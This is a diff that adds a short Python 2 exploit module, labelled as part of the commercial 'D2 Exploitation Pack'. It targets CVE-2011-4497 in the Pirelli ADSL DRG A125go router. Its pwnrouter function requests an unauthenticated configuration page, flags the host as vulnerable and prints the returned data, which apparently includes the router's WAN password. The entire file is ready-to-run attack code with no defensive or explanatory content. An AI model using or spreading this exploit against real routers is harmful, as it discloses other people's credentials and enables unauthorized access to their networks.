@@ -1,0 +1,47 @@
+#! /usr/bin/env python2
+ 
+#
+# Proprietary D2 Exploitation Pack source code - use only under the license
+# agreement specified in LICENSE.txt in your D2 Exploitation Pack
+#
+# Copyright DSquare Security, LLC, 2007-2013
+#
+
+###
+# STD modules
+###
+import os, sys, re
+import cStringIO
+try:
+  import pycurl
+except:
+  print 'No module pycurl'
+
+_name_   = 'd2sec_pirelli_1'
+_vendor_ = 'pirelli'
+_model_  = ['ADSL DRG A125go']
+_vuln_   = 'Password Disclosure'
+_cve_    = 'CVE-2011-4497'
+_ref_    = ''
+_port_   = 80
+
+def pwnrouter(host):
+  try:
+    nfo = cStringIO.StringIO()
+    c = pycurl.Curl()
+    c.setopt(pycurl.URL, 'http://%s/wansinglecfg.cmd?action=view' % host)
+    c.setopt(pycurl.WRITEFUNCTION, nfo.write)
+    c.setopt(pycurl.USERAGENT, 'Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.0.1)')
+    c.perform()
+  except Exception, e:
+    print '[-] error : %s' % e
+    return
+  status = c.getinfo(pycurl.HTTP_CODE)
+  if status != 200:
+    print '[+] %s not vulnerable' % host
+    return
+  data = nfo.getvalue()
+  print '[+] %s vulnerable\n\n%s' % (host, data)
+
+if __name__ == "__main__":
+  pwnrouter(sys.argv[1])
